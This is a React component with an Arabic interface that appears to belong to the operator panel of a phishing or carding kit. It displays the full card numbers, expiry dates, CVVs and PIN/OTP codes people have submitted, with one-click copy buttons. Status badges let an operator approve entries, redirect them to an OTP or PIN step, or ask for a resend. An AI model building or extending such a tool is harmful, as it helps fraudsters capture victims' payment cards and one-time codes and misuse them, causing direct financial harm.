"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  showActions,
  isLatest,
  actions,
  icon,
  color,
  layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) {
        window.clearTimeout(copyResetTimeoutRef.current)
      }
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const trimmed = value.trim()
    if (!trimmed) return false
    if (trimmed.includes("•") || trimmed.includes("*")) return false
    if (trimmed === "غير محدد") return false
    return true
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false

    const fallbackCopy = () => {
      const textarea = document.createElement("textarea")
      textarea.value = normalized
      textarea.setAttribute("readonly", "")
      textarea.style.position = "fixed"
      textarea.style.top = "-1000px"
      textarea.style.opacity = "0"
      document.body.appendChild(textarea)
      textarea.focus()
      textarea.select()
      const copied = document.execCommand("copy")
      document.body.removeChild(textarea)
      return copied
    }

    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(normalized)
        return true
      } catch {
        return fallbackCopy()
      }
    }

    return fallbackCopy()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) {
      toast.error("لا توجد قيمة قابلة للنسخ")
      return
    }

    const copied = await copyWithFallback(value)
    if (!copied) {
      toast.error("تعذر نسخ القيمة")
      return
    }

    setCopiedField(field)
    if (copyResetTimeoutRef.current) {
      window.clearTimeout(copyResetTimeoutRef.current)
    }
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField((currentField) => (currentField === field ? null : currentField))
    }, 1500)

    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }
  // Get status badge
  const getStatusBadge = () => {
    if (!status) return null
    
    const badges: Record<string, { text: string; className: string }> = {
      pending: { text: "⏳ قيد المراجعة", className: "bg-yellow-100 text-yellow-800 border-yellow-300" },
      approved: { text: "✓ تم القبول", className: "bg-green-100 text-green-800 border-green-300" },
      rejected: { text: "✗ تم الرفض", className: "bg-red-100 text-red-800 border-red-300" },
      approved_with_otp: { text: "🔑 تحول OTP", className: "bg-blue-100 text-blue-800 border-blue-300" },
      approved_with_pin: { text: "🔐 تحول PIN", className: "bg-purple-100 text-purple-800 border-purple-300" },
      resend: { text: "🔄 إعادة إرسال", className: "bg-orange-100 text-orange-800 border-orange-300" }
    }
    
    const badge = badges[status]
    if (!badge) return null
    
    return (
      <span className={`px-2 py-1 rounded-md text-xs font-bold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  // Get color styles
  const getColorStyles = () => {
    const colors = {
      blue: {
        gradient: 'from-blue-600 via-blue-500 to-blue-700',
        border: 'border-blue-400',
        iconBg: 'bg-blue-500',
        titleColor: 'text-blue-900'
      },
      green: {
        gradient: 'from-green-600 via-green-500 to-green-700',
        border: 'border-green-400',
        iconBg: 'bg-green-500',
        titleColor: 'text-green-900'
      },
      purple: {
        gradient: 'from-purple-600 via-purple-500 to-purple-700',
        border: 'border-purple-400',
        iconBg: 'bg-purple-500',
        titleColor: 'text-purple-900'
      },
      orange: {
        gradient: 'from-orange-600 via-orange-500 to-orange-700',
        border: 'border-orange-400',
        iconBg: 'bg-orange-500',
        titleColor: 'text-orange-900'
      },
      pink: {
        gradient: 'from-pink-600 via-pink-500 to-pink-700',
        border: 'border-pink-400',
        iconBg: 'bg-pink-500',
        titleColor: 'text-pink-900'
      },
      indigo: {
        gradient: 'from-indigo-600 via-indigo-500 to-indigo-700',
        border: 'border-indigo-400',
        iconBg: 'bg-indigo-500',
        titleColor: 'text-indigo-900'
      },
      gray: {
        gradient: 'from-gray-700 via-gray-600 to-gray-800',
        border: 'border-gray-400',
        iconBg: 'bg-gray-500',
        titleColor: 'text-gray-900'
      }
    }
    
    return colors[color || 'blue']
  }
  
  const colorStyles = getColorStyles()

  // Format timestamp to match screenshot format (12-10 | 7:45 pm)
  const formatTimestamp = (timestamp: string | Date) => {
    const date = new Date(timestamp)
    const month = String(date.getMonth() + 1).padStart(2, '0')
    const day = String(date.getDate()).padStart(2, '0')
    let hours = date.getHours()
    const minutes = String(date.getMinutes()).padStart(2, '0')
    const ampm = hours >= 12 ? 'pm' : 'am'
    hours = hours % 12 || 12
    
    return `${month}-${day} | ${hours}:${minutes} ${ampm}`
  }

  // Format relative time
  const formatRelativeTime = (timestamp: string | Date) => {
    const now = new Date()
    const time = new Date(timestamp)
    const diffMs = now.getTime() - time.getTime()
    
    if (diffMs < 0) return 'الآن'
    
    const diffSecs = Math.floor(diffMs / 1000)
    const diffMins = Math.floor(diffSecs / 60)
    const diffHours = Math.floor(diffMins / 60)
    const diffDays = Math.floor(diffHours / 24)
    
    if (diffSecs < 10) return 'الآن'
    if (diffSecs < 60) return 'منذ لحظات'
    if (diffMins === 1) return 'منذ دقيقة'
    if (diffMins < 60) return `منذ ${diffMins} د`
    if (diffHours === 1) return 'منذ ساعة'
    if (diffHours < 24) return `منذ ${diffHours} س`
    if (diffDays === 1) return 'منذ يوم'
    return `منذ ${diffDays} يوم`
  }

  // Check if this is a card data bubble (has card-specific fields)
  const isCardData = title === "معلومات البطاقة" || data["رقم البطاقة"] || data["نوع البطاقة"]

  // Render credit card style for card data (both layouts use same design)
  if (isCardData) {
    const rawCardNumber = (data["رقم البطاقة"] || data["Card Number"] || "").toString().replace(/\s+/g, "")
    let cardNumber = rawCardNumber || "••••••••••••••••"
    // Format card number with spaces (4 digits per group)
    if (cardNumber) {
      cardNumber = cardNumber.match(/.{1,4}/g)?.join(' ') || cardNumber
    }
    const rawExpiryDate = (data["تاريخ الانتهاء"] || data["Expiry"] || "").toString().trim()
    const expiryDate = rawExpiryDate || "••/••"
    const rawCvv = (data["CVV"] || data["الكود"] || "").toString().trim()
    const cvv = rawCvv || "•••"
    const holderName = data["اسم حامل البطاقة"] || data["Card Holder"] || "CARD HOLDER"
    const cardType = (data["نوع البطاقة"] || data["Card Type"] || "CARD").toString().trim()
    const cardLevel = (
      data["مستوى البطاقة"] ||
      data["Card Level"] ||
      data["Level"] ||
      ""
    )
      .toString()
      .trim()
    const bankName = data["البنك"] || data["Bank"] || "بنك غير محدد"
    const bankCountry = data["بلد البنك"] || data["Country"] || ""
    const typeLower = cardType.toLowerCase()
    const isHorizontalLayout = layout === "horizontal"

    let brandLabel = "CARD"
    if (typeLower.includes("visa")) brandLabel = "VISA"
    else if (typeLower.includes("master")) brandLabel = "MASTERCARD"
    else if (typeLower.includes("mada")) brandLabel = "MADA"
    else if (typeLower.includes("amex") || typeLower.includes("american")) brandLabel = "AMEX"

    const brandClass =
      brandLabel === "VISA"
        ? "bg-blue-900/40 text-blue-100 border-blue-200/40"
        : brandLabel === "MASTERCARD"
        ? "bg-red-900/40 text-red-100 border-red-200/40"
        : brandLabel === "MADA"
        ? "bg-emerald-900/40 text-emerald-100 border-emerald-200/40"
        : "bg-white/15 text-white border-white/30"
    
    return (
      <div className="bg-gradient-to-b from-white to-gray-50 rounded-xl p-3 border border-gray-200 shadow-sm" style={{ fontFamily: 'Cairo, Tajawal, sans-serif' }}>
        {/* Header - Timestamp and Title */}
        <div className="mb-3 flex items-center justify-between gap-2">
          <div className="text-right">
            <h3 className="text-sm font-bold text-gray-800">{title}</h3>
            {timestamp && (
              <div className="text-[11px] text-gray-500">
                {formatRelativeTime(timestamp)}
              </div>
            )}
          </div>
          {timestamp && (
            <div className="text-[10px] text-gray-500 bg-white border border-gray-200 px-2 py-1 rounded-md whitespace-nowrap">
              {formatTimestamp(timestamp)}
            </div>
          )}
        </div>

        {/* Credit Card */}
        <div 
          className={`relative bg-gradient-to-br ${colorStyles.gradient} ${colorStyles.border} border rounded-2xl shadow-lg text-white overflow-hidden mb-2 ${
            isHorizontalLayout ? "p-3" : "p-4"
          }`}
          style={{ aspectRatio: isHorizontalLayout ? "2.05 / 1" : "1.78 / 1" }}
        >
          {/* Card Background Pattern */}
          <div className="absolute inset-0 opacity-20">
            <div className="absolute top-0 right-0 w-40 h-40 bg-white rounded-full -translate-y-1/2 translate-x-1/2"></div>
            <div className="absolute bottom-0 left-0 w-36 h-36 bg-white rounded-full translate-y-1/2 -translate-x-1/2"></div>
            <div className="absolute -left-10 top-1/2 h-16 w-56 -translate-y-1/2 -rotate-12 bg-white/15 blur-xl"></div>
          </div>
          <div className="absolute inset-0 bg-gradient-to-tr from-black/20 via-white/0 to-white/20" />

          {/* Card Content */}
          <div className="relative h-full flex flex-col justify-between">
            {/* Top Section */}
            <div className="flex items-start justify-between mb-2">
              <div className="flex items-center gap-2">
                <div className="w-11 h-8 rounded-md border border-amber-100/50 bg-gradient-to-br from-amber-200 to-yellow-500 shadow-inner" />
                <div className="opacity-90">
                  <svg width="22" height="18" viewBox="0 0 22 18" fill="none">
                    <path d="M2 9h4" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
                    <path d="M1 5.5c2.2 0 4 1.8 4 4S3.2 13.5 1 13.5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
                    <path d="M1 2c4.1 0 7.5 3.4 7.5 7.5S5.1 17 1 17" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
                  </svg>
                </div>
                {icon && (
                  <span className={`w-8 h-8 rounded-full ${colorStyles.iconBg} border border-white/30 flex items-center justify-center text-sm`}>
                    {icon}
                  </span>
                )}
              </div>

              <div className="flex items-center gap-1.5">
                <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold border ${brandClass}`}>
                  {brandLabel}
                </span>
                {isLatest && (
                  <span className="px-2 py-0.5 bg-white/20 backdrop-blur-sm text-white text-[10px] font-bold rounded-full border border-white/30">
                    الأحدث
                  </span>
                )}
              </div>
            </div>

            {/* Middle Section - Card Number */}
            <div className="flex flex-col gap-1 my-2 sm:my-3">
              <div className="flex items-center justify-center gap-2">
                <div
                  className={`font-bold tracking-[0.12em] text-center drop-shadow-sm ${
                    isHorizontalLayout ? "text-lg sm:text-xl" : "text-xl sm:text-[1.45rem]"
                  }`}
                  style={{ direction: "ltr", fontFamily: "'Courier New', monospace", letterSpacing: '0.08em' }}
                >
                  {cardNumber}
                </div>
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawCardNumber)}
                  disabled={!isCopyableValue(rawCardNumber)}
                  className="rounded-md border border-white/40 bg-white/20 px-2 py-0.5 text-[10px] font-bold text-white transition-colors hover:bg-white/30 disabled:cursor-not-allowed disabled:opacity-40"
                  aria-label="نسخ رقم البطاقة"
                  title="نسخ رقم البطاقة"
                >
                  {copiedField === "cardNumber" ? "✓ تم" : "نسخ"}
                </button>
              </div>
              <div className="mt-2 rounded-lg border border-white/25 bg-white/15 px-2 py-1 text-[11px] backdrop-blur-sm">
                <div className="flex items-center justify-between gap-2">
                  <span className="truncate font-semibold">{bankName}</span>
                  <span className="shrink-0 text-[10px] opacity-90">
                    {[cardType, cardLevel].filter(Boolean).join(" • ")}
                  </span>
                </div>
              </div>
            </div>

            {/* Bottom Section */}
            <div className="grid grid-cols-3 gap-2 mt-auto items-end">
              <div className="text-center">
                <div className="text-[10px] opacity-70">الانتهاء</div>
                <div className="flex items-center justify-center gap-1">
                  <div className="font-bold text-base" style={{ direction: "ltr" }}>{expiryDate}</div>
                  <button
                    type="button"
                    onClick={() => void handleCopy("expiryDate", rawExpiryDate)}
                    disabled={!isCopyableValue(rawExpiryDate)}
                    className="rounded-md border border-white/40 bg-white/20 px-1.5 py-0.5 text-[9px] font-bold text-white transition-colors hover:bg-white/30 disabled:cursor-not-allowed disabled:opacity-40"
                    aria-label="نسخ تاريخ الانتهاء"
                    title="نسخ تاريخ الانتهاء"
                  >
                    {copiedField === "expiryDate" ? "✓" : "نسخ"}
                  </button>
                </div>
              </div>
              <div className="text-center">
                <div className="text-[10px] opacity-70">CVV</div>
                <div className="flex items-center justify-center gap-1">
                  <div className="font-bold text-base" style={{ direction: "ltr" }}>{cvv}</div>
                  <button
                    type="button"
                    onClick={() => void handleCopy("cvv", rawCvv)}
                    disabled={!isCopyableValue(rawCvv)}
                    className="rounded-md border border-white/40 bg-white/20 px-1.5 py-0.5 text-[9px] font-bold text-white transition-colors hover:bg-white/30 disabled:cursor-not-allowed disabled:opacity-40"
                    aria-label="نسخ CVV"
                    title="نسخ CVV"
                  >
                    {copiedField === "cvv" ? "✓" : "نسخ"}
                  </button>
                </div>
              </div>
              <div className="text-left">
                <div className="text-[10px] opacity-70">حامل البطاقة</div>
                <div className="font-semibold text-xs truncate uppercase">
                  {holderName}
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="mb-2 flex flex-wrap gap-2">
          <span className="inline-flex items-center rounded-full bg-blue-50 text-blue-700 border border-blue-200 px-2.5 py-1 text-xs font-semibold">
            {bankName}
          </span>
          {bankCountry && (
            <span className="inline-flex items-center rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200 px-2.5 py-1 text-xs font-semibold">
              {bankCountry}
            </span>
          )}
          <span className="inline-flex items-center rounded-full bg-gray-100 text-gray-700 border border-gray-200 px-2.5 py-1 text-xs font-semibold">
            {cardType}
          </span>
          {cardLevel && (
            <span className="inline-flex items-center rounded-full bg-amber-50 text-amber-700 border border-amber-200 px-2.5 py-1 text-xs font-semibold">
              {cardLevel}
            </span>
          )}
        </div>

        {/* Footer - Status and Actions */}
        <div className="flex flex-col items-start gap-2 sm:flex-row sm:items-center sm:justify-between">
          <div>
            {getStatusBadge()}
          </div>
          {showActions && actions && (
            <div className="w-full sm:w-auto">
              {actions}
            </div>
          )}
        </div>
      </div>
    )
  }

  // Check if this is a numeric display (PIN, OTP only - exclude Phone)
  const isPinOrOtp = title.includes("PIN") || title.includes("رمز") || title.includes("كلمة مرور") || title.includes("OTP") || title.includes("كود")
  
  // Get the main value to display in digit boxes
  let digitValue = ""
  if (isPinOrOtp) {
    // Find the numeric value (usually the first or only value)
    const entries = Object.entries(data)
    if (entries.length > 0) {
      digitValue = entries[0][1]?.toString() || ""
    }
  }

  // Default layout for non-card data (OTP, PIN, etc.)
    return (
      <div className="bg-gray-50 rounded-lg p-2 border border-gray-300" style={{ fontFamily: 'Cairo, Tajawal, sans-serif' }}>
      {/* Header - Timestamp and Title */}
      <div className="mb-2">
        {timestamp && (
          <div className="text-[10px] text-gray-500 text-right mb-0.5">
            {formatTimestamp(timestamp)}
          </div>
        )}
        <h3 className="text-sm font-bold text-gray-800 text-center">{title}</h3>
      </div>

      {/* Content - Digit Boxes for PIN/OTP or Regular Display */}
      {isPinOrOtp && digitValue ? (
        <div className="flex justify-center gap-1 mb-2" style={{ direction: 'ltr' }}>
          {digitValue.split('').map((digit, index) => (
            <div 
              key={index}
              className="bg-white rounded shadow-sm flex items-center justify-center w-8 h-10"
            >
              <span className="text-xl font-bold text-gray-900">{digit}</span>
            </div>
          ))}
        </div>
      ) : (
        <div className="bg-white rounded p-2 shadow-sm mb-2">
          <div className="space-y-2">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              return (
                <div key={key} className="flex justify-between items-center gap-2 text-sm">
                  <span className="font-semibold text-gray-600">{key}:</span>
                  <span className="text-gray-900 font-bold text-right">
                    {value?.toString() || "-"}
                  </span>
                </div>
              )
            })}
          </div>
        </div>
      )}

      {/* Footer - Status and Actions */}
      <div className="flex flex-col items-start gap-2 sm:flex-row sm:items-center sm:justify-between">
        <div>
          {getStatusBadge()}
        </div>
        {showActions && actions && (
          <div className="w-full sm:w-auto">
            {actions}
          </div>
        )}
      </div>
    </div>
  )
}
